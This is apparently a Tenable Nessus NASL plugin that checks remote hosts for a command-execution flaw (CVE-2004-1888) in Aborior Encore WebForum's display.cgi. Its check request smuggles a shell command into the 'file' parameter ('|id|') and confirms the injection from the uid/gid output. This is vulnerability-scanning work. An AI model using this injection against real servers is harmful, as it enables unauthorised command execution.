#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(12127);
 script_cve_id("CVE-2004-1888");
 script_bugtraq_id(10040);
 script_osvdb_id(16831);
 script_version ("$Revision: 1.20 $");
 
 script_name(english:"Aborior Encore WebForum display.cgi file Parameter Command Execution");
 script_summary(english:"Detects display.cgi");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web forum that is affected by a
remote command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Aborior Web Forum.

There is a flaw in this version that could allow an attacker to execute
arbitrary commands on this server with the privileges of the affected
web server." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Apr/19" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/04/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/04/04");
 script_cvs_date("$Date: 2016/09/22 15:18:21 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

http_check_remote_code (
			check_request:"/display.cgi?preftemp=temp&page=anonymous&file=|id|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
